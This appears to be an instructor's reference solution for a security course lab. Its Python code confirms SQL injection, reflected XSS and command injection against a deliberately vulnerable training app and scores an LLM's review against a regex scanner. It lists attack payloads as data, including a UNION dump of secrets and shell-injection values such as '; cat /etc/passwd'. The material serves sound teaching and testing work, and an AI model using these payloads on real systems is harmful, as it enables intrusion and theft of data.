"""Week 6 studio — REFERENCE SOLUTION (instructor-only).

A filled-in copy of ``starter.py``: identical function names and signatures, so
the *provided* ``test_studio.py`` passes when this module is imported in place of
``starter``. Verify with ``studios/_verify_solutions.py``.

The discipline this file enforces (axis 3): a finding is NOT real until a SOUND
ORACLE confirms a security-relevant effect. Every confirm_* function pairs an
attack payload with an oracle that checks the *effect* (a leaked canary, an
UNescaped ``<script>``, ``injection_detected``) — never a mere echo — and carries
a benign/true-negative control so we can prove the oracle does not cry wolf.

The guarantee test lives in ``test_studio.py``: the line-oriented scanner MISSES
the 2-line SQLi (recall < 1.0), and NEITHER arm truthfully finds Broken Access
Control (the app has none; the LLM hallucinates it). That is OWASP-2021 #1 as
data — automation is worst at the class that is about intent, not syntax.

DO NOT ship to students — excluded via ``studios/.gitignore``. The teaching
walkthrough is ``solution.ipynb`` (imports this file rather than re-pasting it).
"""

from __future__ import annotations

import json
import re

from seclab.attack import Payload, Finding, run_payloads, contains_oracle
from seclab.scan import ScanResult

from webharness import (login_send, reflect_send, reflect_safe_send, ping_send,
                        RULE_ALIASES)


# ============================================================================
# TASK 1 — three oracle-confirmed findings against the running vuln-web app
# ============================================================================

def confirm_sqli() -> list[Finding]:
    """SQL injection at /login, confirmed by EXTRACTING the admin canary."""
    payloads = [
        # Auth-bypass: user='admin' OR '1'='1' -> the admin row (with its secret).
        Payload("admin' OR '1'='1", intent="auth-bypass", family="sqli"),
        # Comment out the password check entirely.
        Payload("admin'--", intent="comment-out", family="sqli"),
        # UNION dump — the strongest proof: pull the secret column for every row.
        Payload("x' UNION SELECT user, secret FROM users--",
                intent="union-dump", family="sqli"),
        # Benign control: a real user with the WRONG password must NOT leak.
        Payload("alice", intent="legit login, wrong pw", family="benign"),
    ]
    # contains_oracle confirms only if the canary comes BACK (exfiltrated row),
    # not if the payload is merely echoed.
    return run_payloads(payloads, send=login_send,
                        oracle=contains_oracle("FLAG-sqli-"))


def confirm_xss() -> tuple[Finding, Finding]:
    """Reflected XSS at ``/?name=`` — and the true negative at ``/safe?name=``.

    The oracle's sound *necessary* condition for execution is that the
    ``<script>`` tag survives UNescaped in the response. An html.escape'd
    reflection (``&lt;script&gt;``) is reflection, not XSS — so /safe must NOT
    confirm.
    """
    marker = "<script>alert('XSS-FIRED-7f3a')</script>"

    def xss_oracle(payload, response):
        text = response if isinstance(response, str) else str(response)
        # Necessary condition to EXECUTE: the raw, unescaped <script> tag is
        # present. If it came back as &lt;script&gt; this is False (encoded).
        unescaped = "<script>" in text.lower()
        return unescaped, ("unescaped <script> survived in response"
                           if unescaped else "no unescaped <script> (encoded / absent)")

    p = Payload(marker, intent="reflected xss marker", family="xss")
    vuln_f = run_payloads([p], send=reflect_send, oracle=xss_oracle)[0]
    safe_f = run_payloads([p], send=reflect_safe_send, oracle=xss_oracle)[0]
    return vuln_f, safe_f


def confirm_cmdi() -> list[Finding]:
    """Command injection at /ping, confirmed on ``injection_detected``."""
    def cmdi_oracle(payload, response):
        try:
            data = json.loads(response)
        except (ValueError, TypeError):
            return False, "response was not JSON"
        hit = data.get("injection_detected") is True
        return hit, ("a shell metacharacter reached the command context"
                     if hit else "no metacharacter reached the command")

    payloads = [
        Payload("127.0.0.1; cat /etc/passwd", intent="semicolon chain", family="cmdi"),
        Payload("127.0.0.1 && whoami", intent="&& chain", family="cmdi"),
        Payload("127.0.0.1 | id", intent="pipe", family="cmdi"),
        # Benign control: a plain host with no metacharacters must NOT confirm.
        Payload("127.0.0.1", intent="legit host", family="benign"),
    ]
    return run_payloads(payloads, send=ping_send, oracle=cmdi_oracle)


# ============================================================================
# TASK 2 — the duel: parse the LLM arm's output into ScanResults
# ============================================================================

def parse_llm_review(raw: str) -> list[ScanResult]:
    """Parse a model's free-text vulnerability review into ScanResults.

    For each line that names a vulnerability at a ``do_<name>`` location, map the
    prose name to a canonical rule via ``RULE_ALIASES`` and emit one ScanResult.
    Parse FAITHFULLY — including the dubious Broken-Access-Control claim and the
    finding on ``do_reflect_safe``. Whether those are real is decided by scoring
    against the ground truth, not by this parser.
    """
    # Match the longest alias first so "reflected xss" wins over the bare "xss"
    # (both map to the same rule, but this avoids double-counting a line).
    aliases = sorted(RULE_ALIASES.items(), key=lambda kv: -len(kv[0]))
    loc_re = re.compile(r"do_\w+")

    out: list[ScanResult] = []
    for line in raw.splitlines():
        low = line.lower()
        rule = next((canon for alias, canon in aliases if alias in low), None)
        loc_m = loc_re.search(line)
        if rule is None or loc_m is None:
            continue
        # Faithfully record severity if the line advertises one, e.g. "[HIGH]".
        sev_m = re.search(r"\[(\w+)\]", line)
        out.append(ScanResult(
            rule=rule, location=loc_m.group(0), tool="llm",
            severity=(sev_m.group(1).lower() if sev_m else "unknown"),
            confidence="model", raw=line.strip(),
        ))
    return out


# ============================================================================
# Task 3 (Control Scorecard + disclosure note) is prose — see README.md.
# ============================================================================


if __name__ == "__main__":
    from seclab.attack import print_summary
    from seclab.scan import compare_scanners, print_comparison
    from webharness import regex_scanner, RAW_LLM_REVIEW, SOURCE, load_ground_truth

    for name, fn in [("SQLi", confirm_sqli), ("cmdi", confirm_cmdi)]:
        print(f"\n== {name} ==")
        print_summary(fn())

    vuln_f, safe_f = confirm_xss()
    print("\n== XSS ==")
    print("  vulnerable / :", "CONFIRMED" if vuln_f.confirmed else "no effect")
    print("  fixed /safe  :", "CONFIRMED" if safe_f.confirmed else "no effect",
          "(true negative)")

    llm = parse_llm_review(RAW_LLM_REVIEW)
    print("\n== Duel ==")
    print_comparison(compare_scanners(
        {"regex-scanner": regex_scanner(SOURCE), "llm": llm},
        load_ground_truth()))
